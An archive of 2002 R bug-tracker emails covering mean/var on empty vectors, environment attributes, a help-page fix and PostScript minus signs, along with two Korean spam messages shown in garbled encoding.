Wed Sep 18 11:01:56 2002	maechler	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2094 *
Subject: Mean and var inconsistency
From: Kevin.Wright@pioneer.com
Date: Wed, 2 Oct 2002 16:19:27 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2094 <==
From Kevin.Wright@pioneer.com  Wed Oct  2 16:19:28 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA05763
	for <R-bugs@biostat.ku.dk>; Wed, 2 Oct 2002 16:19:27 +0200 (MET DST)
Date: Wed, 2 Oct 2002 16:19:27 +0200 (MET DST)
From: Kevin.Wright@pioneer.com
Message-Id: <200210021419.QAA05763@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Mean and var inconsistency

Full_Name: Kevin Wright
Version: 1.5.1
OS: Windows 95
Submission from: (NULL) (170.54.59.160)


Originally posted to r-devel, but after thinking about it more decided that this
is a bug.  I encountered an unexpected difference in the way that mean and var
work: 

> mean(numeric(0)) 
[1] NaN 

> var(numeric(0)) 
Error in var(numeric(0)) : `x' is empty 

Looking into this, I discovered in mean.default that sum(x)/n 
evaluates as 
> sum(numeric(0))/length(numeric(0)) 
[1] NaN 

The function var seems to evaluate this: 
> .Internal(cov(numeric(0),NULL,"all.obs")) 
Error: `x' is empty 

One possible fix would be to modify var to check that the length of x is greater
than 0, otherwise return NaN/NA.  

Just for your information (not necessarily the desirable answer), in S-Plus
2000:
> mean(numeric(0))
NA
> var(numeric(0))
NA


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2159 *
Subject: The class attribute on an environment seems buggy
From: hb@maths.lth.se
Date: Mon, 14 Oct 2002 01:34:45 +0200 (MET DST)
--Not a bug, but perhaps a useful feature: should the attributes of environments
--be copied on assignment?
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2159 <==
From hb@maths.lth.se  Mon Oct 14 01:34:45 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA05119
	for <R-bugs@biostat.ku.dk>; Mon, 14 Oct 2002 01:34:45 +0200 (MET DST)
Date: Mon, 14 Oct 2002 01:34:45 +0200 (MET DST)
From: hb@maths.lth.se
Message-Id: <200210132334.BAA05119@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: The class attribute on an environment seems buggy

Full_Name: Henrik Bengtsson
Version: 1.6.0, 1.5.1
OS: WinXP Pro
Submission from: (NULL) (128.250.252.82)


The following example, which I tested on both R v1.5.1 and R v1.6.0 on WinXP
Pro, shows the problem I encountered when trying to use the class attribute of
an environment:

# Define method print() for class Environment
C

print(e)
# gives:
# [1] "An Environment!"

# Exit [R]
q(save="yes")

When restarting [R] and loading the previous workspace something goes wrong(?):
% R

print(e)
# gives:
# <environment: 01BE52F4>
# attr(,"class")
# [1] "Environment"

print(class(e))
# gives: 
# [1] "Environment"

print(unclass(e))
# gives:
# <environment: 01BE52F4>
# attr(,"class")
# [1] "Environment"

str(e)
# gives because of the malfunctioning unclass():
# Class 'Environment' Class 'Environment' Class 'Environment' Class
'Environment' 
# Class 'Environment' Class 'Environment' Class 'Environment' Class
'Environment' 
# Class 'Environment' Class 'Environment' Class 'Environment' ...

Note how unclass(e) does not work properly. More importantly, it the
S3/UseMethod() method dispatching get confused and won't recognize the class
attribute. 

Cheers

Henrik Bengtsson

Home: 201/445 Royale Parade, Parkville
Office: Bioinformatics, WEHI, Parkville
+61 (0)412 269 734 (cell), +61 (0)3 9387 791 (home), +61 (0)3 9345 2324 +(lab)
hb@maths.lth.se, http://www.maths.lth.se/~hb/
Time zone: +10h UTC (Sweden +2h UTC, Calif. -7h UTC)


==> 2159.followup.1 <==
From jmc@research.bell-labs.com  Mon Oct 14 15:00:33 2002
Received: from dirty.research.bell-labs.com (ns1.research.bell-labs.com [204.178.16.6])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA11041
	for <R-bugs@biostat.ku.dk>; Mon, 14 Oct 2002 15:00:32 +0200 (MET DST)
Received: from grubby.research.bell-labs.com (H-135-104-2-9.research.bell-labs.com [135.104.2.9])
	by dirty.research.bell-labs.com (8.12.5/8.12.5) with ESMTP id g9ECxphN093952;
	Mon, 14 Oct 2002 08:59:51 -0400 (EDT)
Received: from jessie.research.bell-labs.com (jessie.research.bell-labs.com [135.104.13.5])
	by grubby.research.bell-labs.com (8.11.6/8.11.6) with ESMTP id g9ECxia88971;
	Mon, 14 Oct 2002 08:59:44 -0400 (EDT)
Received: from research.bell-labs.com (guinan.cs.bell-labs.com [135.104.50.225])
	by jessie.research.bell-labs.com (8.12.2/8.12.2) with ESMTP id g9ECxhlL005418;
	Mon, 14 Oct 2002 08:59:44 -0400 (EDT)
Sender: jmc@research.bell-labs.com
Message-ID: <3DAABFBF.F7AEC086@research.bell-labs.com>
Date: Mon, 14 Oct 2002 08:59:43 -0400
From: John Chambers <jmc@research.bell-labs.com>
Organization: Bell Labs, Lucent Technologies
X-Mailer: Mozilla 4.79 [en] (X11; U; Linux 2.4.18-4 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: hb@maths.lth.se
CC: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: The class attribute on an environment seems buggy (PR#2159)
References: <200210132334.BAA05124@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Any attribute of environments, not just the class, can be killed by
operating on the object "locally" in a function.

Example:

R> f <- function(x){ y <- x; attr(y, "foo") <- NULL; y}
R> ev <- new.env()
R> attr(ev, "foo") <- "bar"
R> ev
<environment: 0x8b515d4>
attr(,"foo")
[1] "bar"
R> f(ev)
<environment: 0x8b515d4>
R> ev
<environment: 0x8b515d4>

The reason is that the C routine `duplicate' does not duplicate an
environment  OR its attributes.

I was bitten by this trying to use environments as reference objects in
the Omegahat OOP package.

Would there be a problem with a "fix" in which the environment was left
unduplicated, but environments with attributes are "duplicated" by
creating a copy of the attribute list, but with the copy still pointing
to the same environment?

If that is not possible, it would be good to have another datatype that
had roughly those properties.  Otherwise, it's difficult to build on
this datatype in designing new classes.

(The same issue applies to other types, such as external pointers.)

hb@maths.lth.se wrote:
> 
> Full_Name: Henrik Bengtsson
> Version: 1.6.0, 1.5.1
> OS: WinXP Pro
> Submission from: (NULL) (128.250.252.82)
> 
> The following example, which I tested on both R v1.5.1 and R v1.6.0 on WinXP
> Pro, shows the problem I encountered when trying to use the class attribute of
> an environment:
> 
> # Define method print() for class Environment
> C
> 
> print(e)
> # gives:
> # [1] "An Environment!"
> 
> # Exit [R]
> q(save="yes")
> 
> When restarting [R] and loading the previous workspace something goes wrong(?):
> % R
> 
> print(e)
> # gives:
> # <environment: 01BE52F4>
> # attr(,"class")
> # [1] "Environment"
> 
> print(class(e))
> # gives:
> # [1] "Environment"
> 
> print(unclass(e))
> # gives:
> # <environment: 01BE52F4>
> # attr(,"class")
> # [1] "Environment"
> 
> str(e)
> # gives because of the malfunctioning unclass():
> # Class 'Environment' Class 'Environment' Class 'Environment' Class
> 'Environment'
> # Class 'Environment' Class 'Environment' Class 'Environment' Class
> 'Environment'
> # Class 'Environment' Class 'Environment' Class 'Environment' ...
> 
> Note how unclass(e) does not work properly. More importantly, it the
> S3/UseMethod() method dispatching get confused and won't recognize the class
> attribute.
> 
> Cheers
> 
> Henrik Bengtsson
> 
> Home: 201/445 Royale Parade, Parkville
> Office: Bioinformatics, WEHI, Parkville
> +61 (0)412 269 734 (cell), +61 (0)3 9387 791 (home), +61 (0)3 9345 2324 +(lab)
> hb@maths.lth.se, http://www.maths.lth.se/~hb/
> Time zone: +10h UTC (Sweden +2h UTC, Calif. -7h UTC)
> 
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._

-- 
John M. Chambers                  jmc@bell-labs.com
Bell Labs, Lucent Technologies    office: (908)582-2681
700 Mountain Avenue, Room 2C-282  fax:    (908)582-3340
Murray Hill, NJ  07974            web: http://www.cs.bell-labs.com/~jmc

==> 2159.reply.1 <==
From p.dalgaard@biostat.ku.dk  Mon Oct 14 15:54:42 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA11872;
	Mon, 14 Oct 2002 15:54:41 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g9EDsbO25928;
	Mon, 14 Oct 2002 15:54:37 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: John Chambers <jmc@research.bell-labs.com>
Cc: hb@maths.lth.se, r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: The class attribute on an environment seems buggy (PR#2159)
References: <200210132334.BAA05124@pubhealth.ku.dk>
	<3DAABFBF.F7AEC086@research.bell-labs.com>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 14 Oct 2002 15:54:36 +0200
In-Reply-To: <3DAABFBF.F7AEC086@research.bell-labs.com>
Message-ID: <x23cr93z37.fsf@biostat.ku.dk>
Lines: 46
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

John Chambers <jmc@research.bell-labs.com> writes:

> Would there be a problem with a "fix" in which the environment was left
> unduplicated, but environments with attributes are "duplicated" by
> creating a copy of the attribute list, but with the copy still pointing
> to the same environment?
> 
> If that is not possible, it would be good to have another datatype that
> had roughly those properties.  Otherwise, it's difficult to build on
> this datatype in designing new classes.
> 
> (The same issue applies to other types, such as external pointers.)

I've been wrapping such environments in lists, as in

> tclVar
function (init = "") 
{
    n <- evalq(TclVarCount <- TclVarCount + 1, .TkRoot$env)
    name <- paste("RTcl", n, sep = "")
    l <- list(env = new.env())
    assign(name, NULL, envir = l$env)
    reg.finalizer(l$env, function(env) tkcmd("unset", ls(env)))
    class(l) <- "tclVar"
    tclvalue(l) <- init
    l
}

where the list(env = new.env()) construct is to avoid sticking a class
directly on "env". 

What you're suggesting would seem to have the same effect, i.e. the
environment gets effectively embedded in a structure on which you can
set attributes. It does sound like it could work.

I'm just a little worried whether it would be clear enough to the end
user what is going on, or whether we'd just be compounding problems of
duplications that don't duplicate...

BTW, this was never a bug...

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 2159.audit <==
Tue Oct 22 18:16:49 2002	thomas	changed notes
Tue Oct 22 18:16:49 2002	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2197 *
Subject:  Minor changes in ?class 
From: j.c.rougier@durham.ac.uk
Date: Tue, 22 Oct 2002 16:46:38 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2197 <==
From j.c.rougier@durham.ac.uk  Tue Oct 22 17:47:30 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA11849
	for <r-bugs@biostat.ku.dk>; Tue, 22 Oct 2002 17:47:29 +0200 (MET DST)
From: j.c.rougier@durham.ac.uk
Received: from hermes.dur.ac.uk ([129.234.4.9])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 1841F2-00047Y-00
	for <r-bugs@r-project.org>; Tue, 22 Oct 2002 10:46:48 -0500
Received: from euclid (euclid.dur.ac.uk [129.234.21.53])
	by hermes.dur.ac.uk (8.11.1/8.11.1) with ESMTP id g9MFke328211
	for <r-bugs@r-project.org>; Tue, 22 Oct 2002 16:46:40 +0100 (BST)
Received: from arrow.dur.ac.uk by euclid id <g9MFkcE17761@euclid>; Tue, 22 Oct 2002 16:46:38 +0100 (BST)
Date: Tue, 22 Oct 2002 16:46:38 +0100
Message-Id: <20128.200210221546@arrow.dur.ac.uk>
To: r-bugs@r-project.org
Subject:  Minor changes in ?class 
Cc: dma0jcr@arrow.dur.ac.uk
X-MailScanner: Found to be clean

Hi everyone -- these are very minor. In the Arguments section of ?class,

1) it should read "an object" for x
2) "names" in Usage is not specified, it could be included along with 
"what", ie as

names,what: a character vector naming classes.

Cheers, Jonathan.

--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 6.0
 year = 2002
 month = 10
 day = 01
 language = R

Search Path:
 .GlobalEnv, Autoloads, package:base
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2198 *
Subject: ÀÎÅÍ³Ý ¾Æ¸£¹ÙÀÌÆ® ¸ðÁý(±¸ÀÎ±¤°í)
From: Çö´ëÄ³ÇÇÅ» <capitalo@lycos.co.kr>
Date: Wed, 23 Oct 2002 01:16:51 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2198 <==
From capitalo@lycos.co.kr  Tue Oct 22 18:04:46 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA11984
	for <R-bugs@biostat.ku.dk>; Tue, 22 Oct 2002 18:04:43 +0200 (MET DST)
Received: from lycos.co.kr ([211.213.247.55])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with SMTP id g9MG3sC7025797
	for <r-bugs@lists.r-project.org>; Tue, 22 Oct 2002 18:03:59 +0200 (MEST)
Message-Id: <200210221603.g9MG3sC7025797@hypatia.math.ethz.ch>
Reply-To: capitalo@lycos.co.kr
From: Çö´ëÄ³ÇÇÅ» <capitalo@lycos.co.kr>
To: <r-bugs@stat.math.ethz.ch>
Subject: ÀÎÅÍ³Ý ¾Æ¸£¹ÙÀÌÆ® ¸ðÁý(±¸ÀÎ±¤°í)
Sender: Çö´ëÄ³ÇÇÅ» <capitalo@lycos.co.kr>
Mime-Version: 1.0
Content-Type: text/html; charset="ks_c_5601-1987"
Date: Wed, 23 Oct 2002 01:16:51 +0900
Content-Transfer-Encoding: 8bit

<HTML>
<HEAD>
<META content="text/html; charset=ks_c_5601-1987" http-equiv=Content-Type>
<STYLE> p, font, span { line-height:120%; margin-top:0; margin-bottom:0; }</STYLE>
</HEAD><BODY>
<P><STRONG>Çö´ë µå¸²·Ð ÆÐ½º ÇýÅÃ</STRONG></P>
<P>&nbsp;</P>
<P>1.&nbsp;Á÷ÀåÀÌ&nbsp;¾ø¾îµµ&nbsp;¹ß±Þ&nbsp;°¡´É&nbsp;<BR>2.&nbsp;Æò»ý¿¬È¸ºñ&nbsp;¾øÀ½<BR>3.&nbsp;¸¶ÀÌ³Ê½º&nbsp;ÅëÀåÀ»&nbsp;Çö±ÝÄ«µå·Î.....<BR>4.&nbsp;¹«·á&nbsp;º¸Çè&nbsp;2000¸¸¿ø&nbsp;¼­ºñ½º&nbsp;<BR>5.&nbsp;Çö´ë/±â¾ÆÂ÷&nbsp;¼ö¸®Á¤ºñ½Ã&nbsp;5%&nbsp;ÇÒÀÎ<BR>6.&nbsp;ÃÖÀú&nbsp;100¸¸¿ø¿¡¼­&nbsp;ÃÖ´ë&nbsp;2000¸¸¿ø±îÁö&nbsp;ÇÑµµ&nbsp;Á¶Á¤&nbsp;<BR>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>
<a href="http://www.capitalo.co.kr/loan/dream_card/cowork/popup/pd.asp?comp=L0063000&amp;userid=veca" target=blank>
<IMG 
src="http://www.hyundaicard-loan.co.kr/partner/banner/pass2.gif" style="HEIGHT: 101px; WIDTH: 235px"></a></P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P><STRONG>Çö´ëÄ«µå&nbsp; ÇýÅÃ</STRONG> </P>
<P>1.&nbsp;Çö´ë/±â¾Æ&nbsp;ÀÚµ¿Â÷&nbsp;±¸ÀÔ½Ã&nbsp;ÃÖ´ë&nbsp;200¸¸¿ø±îÁö&nbsp;ÇÒÀÎ!&nbsp;<BR>2.&nbsp;ÁÖÀ¯½Ã&nbsp;¸®ÅÍ´ç&nbsp;40¿ø&nbsp;ÇÒÀÎ!&nbsp;+ 70¿ø Àû¸³!<BR>3.&nbsp;»ç¿ë±Ý¾×ÀÇ&nbsp;4%&nbsp;Àû¸³,&nbsp;°¡¸ÍÁ¡&nbsp;Ãß°¡&nbsp;3%·Î&nbsp;ÃÑ&nbsp;7%&nbsp;Àû¸³!<BR>4.&nbsp;Çö´ë/±â¾ÆÂ÷&nbsp;¼ö¸®,&nbsp;Á¤ºñ½Ã&nbsp;5%ÇÒÀÎ!&nbsp;<BR>5.&nbsp;Ç×°ø±Ç,&nbsp;Ã¶µµ&nbsp;½ÂÂ÷±Ç,&nbsp;°í¼Ó¹ö½º&nbsp;5¢¦7%&nbsp;ÇÒÀÎ!&nbsp;<BR>6.&nbsp;ÀÚµ¿Â÷&nbsp;¾ß¿Ü&nbsp;±ØÀå&nbsp;¿ù&nbsp;2È¸&nbsp;¹«·á!&nbsp;<BR>7.&nbsp;1Ãµ¸¸¿ø&nbsp;¹«·á&nbsp;±³Åë»óÇØº¸Çè&nbsp;¼­ºñ½º</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P><a href="http://www.hyundaicard-loan.co.kr/hyundai_card/step_1.php?partner_id=veca" target=blank>
<IMG 
src="http://www.hyundaicard-loan.co.kr/partner/banner/hdc-ban1.gif" style="HEIGHT: 105px; WIDTH: 235px"></a></P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>* ¾Æ¸£¹ÙÀÌÆ® È¨ÆäÀÌÁö ¹Ù·Î °¡±â :</P>
<P>=&gt;&nbsp;<A 
href="http://www.hyundaicard-loan.co.kr/partner/main/partner.php">http://www.hyundaicard-loan.co.kr/partner/main/partner.php</A></P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P><SPAN style="FONT-SIZE: 9pt"><FONT 
size=3>
<P><SPAN style="FONT-SIZE: 9pt">º» ¸ÞÀÏÀº Á¤º¸Åë½Å¸Á ÀÌ¿ëÃËÁø ¹× Á¤º¸º¸È£ µî¿¡ °üÇÑ ¹ý·ü Á¦ 50Á¶¿¡ ÀÇ°ÅÇÑ 
[±¤°í]¸ÞÀÏÀÌ¸ç, <BR>±ÍÇÏÀÇ e-mailÁÖ¼Ò´Â ÀÎÅÍ³Ý»ó¿¡¼­ ÃëµæÇÏ¿´À¸¸ç, ÀÌ¸ÞÀÏÁÖ¼Ò¿Ü ¾î¶°ÇÑ °³ÀÎÁ¤º¸µµ °¡Áö°í ÀÖÁö ¾Ê½À´Ï´Ù. <BR>¼ö½ÅÀ» 
¿øÄ¡ ¾ÊÀ¸½Ã¸é ¼ö½Å°ÅºÎ¸¦ Å¬¸¯ÇØ ÁÖ½Ã¸é °¨»çÇÏ°Ú½À´Ï´Ù. <BR>     </P></SPAN></FONT></SPAN></BODY></HTML>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2199 *
Subject: negative numbers in R plots in Illustrator 8 (and higher?)
From: "RenE J.V. Bertin" <rjvbertin@hotmail.com>
Date: Tue, 22 Oct 2002 18:14:31 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2199 <==
From rjvbertin@hotmail.com  Tue Oct 22 18:15:16 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA12069
	for <r-bugs@biostat.ku.dk>; Tue, 22 Oct 2002 18:15:15 +0200 (MET DST)
Received: from mailfilter.college-de-france.fr ([193.52.22.7] helo=mailhub1.college-de-france.fr)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 1841fu-0004KP-00
	for <r-bugs@r-project.org>; Tue, 22 Oct 2002 11:14:34 -0500
Received: from mail.college-de-france.fr ([192.168.2.3])
	by mailhub1.college-de-france.fr (8.11.0/8.11.0) with ESMTP id g9MGtsS26915
	for <r-bugs@r-project.org>; Tue, 22 Oct 2002 18:55:54 +0200 (CEST)
Received: from bola.college-de-france.fr ([192.168.5.53])
	by mail.college-de-france.fr (8.11.4/8.11.4) with SMTP id g9MGEU247686
	for <r-bugs@r-project.org>; Tue, 22 Oct 2002 18:14:30 +0200 (CEST)
	(envelope-from rjvbertin@hotmail.com)
Date: Tue, 22 Oct 2002 18:14:31 +0200
From: "RenE J.V. Bertin" <rjvbertin@hotmail.com>
To: "r-bugs@r-project.org" <r-bugs@r-project.org>
Subject: negative numbers in R plots in Illustrator 8 (and higher?)
Message-Id: <20021022181431.72665f71.rjvbertin@hotmail.com>
X-Mailer: Sylpheed version 0.7.8claws (GTK+ 1.2.10; )
X-No-Archive: Yes
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

Negative numbers in (encapsulated) postscript generated by R loose their sign when opened in Adobe Illustrator 8 (french). This was so in 1.5.x and remains in 1.6.0.

I suppose that this is a known issue, although it is rather a flaw in Illustrator than in R, if my analysis of it is correct. I sent a lengthy mail containing a solution (ISOLatin1Encoding has to be redefined) to the r-help mailing list, where it never arrived.

Is there any interest in that I retype it and send it here?

RenE Bertin.

==> 2199.reply.1 <==
From p.dalgaard@biostat.ku.dk  Tue Oct 22 18:46:20 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA12241;
	Tue, 22 Oct 2002 18:46:19 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g9MGkEC08263;
	Tue, 22 Oct 2002 18:46:14 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: rjvbertin@hotmail.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: negative numbers in R plots in Illustrator 8 (and higher?) (PR#2199)
References: <200210221615.SAA12074@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 22 Oct 2002 18:46:13 +0200
In-Reply-To: <200210221615.SAA12074@pubhealth.ku.dk>
Message-ID: <x2znt6ctgq.fsf@biostat.ku.dk>
Lines: 26
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

rjvbertin@hotmail.com writes:

> Negative numbers in (encapsulated) postscript generated by R loose
> their sign when opened in Adobe Illustrator 8 (french). This was so
> in 1.5.x and remains in 1.6.0.
> 
> I suppose that this is a known issue, although it is rather a flaw
> in Illustrator than in R, if my analysis of it is correct. I sent a
> lengthy mail containing a solution (ISOLatin1Encoding has to be
> redefined) to the r-help mailing list, where it never arrived.
> 
> Is there any interest in that I retype it and send it here?

First tell us your analysis... There is some weirdness with
hyphen-vs-minus in the ISOLatin1Encoding, which I at some point got
convinced that we're actually Doing According To Standards, weird as
it might seem. However, if Adobe themselves are getting it wrong, we
might reconsider our position.

I think it is Brian who has the scars from that particular battle.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 2199.followup.1 <==
From rjvbertin@hotmail.com  Tue Oct 22 19:48:42 2002
Received: from mailhub1.college-de-france.fr (mailfilter.college-de-france.fr [193.52.22.7])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA12414;
	Tue, 22 Oct 2002 19:48:42 +0200 (MET DST)
Received: from mail.college-de-france.fr ([192.168.2.3])
	by mailhub1.college-de-france.fr (8.11.0/8.11.0) with ESMTP id g9MITMS28413;
	Tue, 22 Oct 2002 20:29:22 +0200 (CEST)
Received: from bola.college-de-france.fr ([192.168.5.53])
	by mail.college-de-france.fr (8.11.4/8.11.4) with SMTP id g9MHlw250107;
	Tue, 22 Oct 2002 19:47:58 +0200 (CEST)
	(envelope-from rjvbertin@hotmail.com)
Date: Tue, 22 Oct 2002 19:48:00 +0200
From: "RenE J.V. Bertin" <rjvbertin@hotmail.com>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: negative numbers in R plots in Illustrator 8 (and higher?) (PR#2199)
Message-Id: <20021022194800.6982fee2.rjvbertin@hotmail.com>
In-Reply-To: <x2znt6ctgq.fsf@biostat.ku.dk>
References: <200210221615.SAA12074@pubhealth.ku.dk>
	<x2znt6ctgq.fsf@biostat.ku.dk>
X-Mailer: Sylpheed version 0.7.8claws (GTK+ 1.2.10; )
X-No-Archive: Yes
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

On 22 Oct 2002 18:46:13 +0200, Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk> wrote regarding "Re:
negative numbers in R plots in Illustrator 8 (and higher?) (PR#2199)"


8-) > Is there any interest in that I retype it and send it here?
8-) 
8-) First tell us your analysis... There is some weirdness with
8-) hyphen-vs-minus in the ISOLatin1Encoding, which I at some point got

	Indeed, it is that. Illustrator expects a hyphen at position 45, and not the minus that indeed appears to be the standard. ISO 1252 Latin 1 encoding does put the hyphen at that position.
There is not much difference between the hyphen and the minus glyphs; the former is slightly narrower than the latter. And it seems to be the hyphen that is generated by most keyboards.


8-) it might seem. However, if Adobe themselves are getting it wrong, we
8-) might reconsider our position.

	Well, there *is* some sort of issue with them. If the encoding calls for a minus, they should show it, and not silently ignore it! Or give a warning if the requested font doesn't have it.

Considering your position: just how easy is it to forget or overlook (the absence of) a sign? :)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2200 *
Subject: =?ks_c_5601-1987?B?W7GksO1dIL7ux9Cxs8DnILy8sOggxse4xSAxwKcgxeXF9bnMv6G8rSC5q7fhu/nHwyBDRLimILq4s7u15biztM+02S4=?=
From: =?ks_c_5601-1987?B?xeXF9bnM?= <hyun10310@kornet.net>
Date: Wed, 23 Oct 2002 03:19:26 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2200 <==
From hyun10310@kornet.net  Tue Oct 22 20:21:37 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA12576
	for <R-bugs@biostat.ku.dk>; Tue, 22 Oct 2002 20:21:36 +0200 (MET DST)
Received: from relay4.kornet.net (relay4.kornet.net [211.48.62.164])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id g9MIKpC6026630
	for <r-bugs@stat.math.ethz.ch>; Tue, 22 Oct 2002 20:20:52 +0200 (MEST)
Received: from your-afc98a0fg0 (61.73.152.25) by relay4.kornet.net; 23 Oct 2002 03:20:42 +0900
Message-ID: <3db596fa3e57c405@relay4.kornet.net> (added by relay4.kornet.net)
From: =?ks_c_5601-1987?B?xeXF9bnM?= <hyun10310@kornet.net>
To: r-bugs@stat.math.ethz.ch
Subject: =?ks_c_5601-1987?B?W7GksO1dIL7ux9Cxs8DnILy8sOggxse4xSAxwKcgxeXF9bnMv6G8rSC5q7fhu/nHwyBDRLimILq4s7u15biztM+02S4=?=
Date: Wed, 23 Oct 2002 03:19:26 +0900
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0037_01C0F19A.93A26C00"
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 6.00.2600.0000
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000

This is a multi-part message in MIME format.

------=_NextPart_000_0037_01C0F19A.93A26C00
Content-Type: text/plain;
	charset="ks_c_5601-1987"
Content-Transfer-Encoding: base64

a2xjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogDQogDQogDQogDQogDQog
u/nHw0NEIL3Fw7vA2rTCIMHWvNLIrsDOsPogx9SysiC5q7fht84gu/nHw0NEuKYgud7AuyC8
9iDA1sC4uOcgDQogwM/B1sDPsKMgx9C9wMO8x+jAxyCx4si4uKYgteW4s7TPtNkuDQogDQog
CQkJICAgwMy4py4uLiAgOiAgICAgIA0KIMH3vvcuLi4gIDogICAJCQkJCQkJIAkJCcH3wOXA
ziAJCQnA2r+1vvcgCQkJwda6ziAJCQm068fQu/0gCQkJsO217sfQu/0gCQkJwd/H0Lv9IAkJ
CcPKte7H0Lv9CQkJCQkJCbHixbggCQkJCSAJCQkJDQogwPzIrS4uLiAgOiAgICAgIA0KIMfa
